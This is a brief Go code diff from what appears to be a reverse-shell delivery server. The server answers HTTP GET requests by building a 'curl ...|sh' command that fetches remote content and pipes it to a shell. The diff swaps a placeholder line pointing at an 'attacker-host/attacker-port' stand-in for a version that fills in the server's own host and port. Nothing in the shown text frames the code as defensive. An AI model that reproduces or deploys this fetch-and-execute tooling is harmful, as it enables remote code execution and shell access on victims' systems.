@@ -75,7 +75,13 @@ func (s *TCPServer) Run() {
 		if string(buffer[:n]) == "GET " {
 			requestURI := client.ReadUntilClean(" ")
 			log.Info("Request URI: %s", requestURI)
-			var command string = "curl http://reverse.service/attacker-host/attacker-port|sh"
+			var command string = fmt.Sprintf(
+				"curl http://%s:%d/%s/%d|sh",
+				s.Host,
+				s.Port,
+				s.Host,
+				s.Port,
+			)
 			target := strings.Split(requestURI, "/")
 			if strings.HasPrefix(requestURI, "/") && len(target) == 3 {
 				host := target[1]
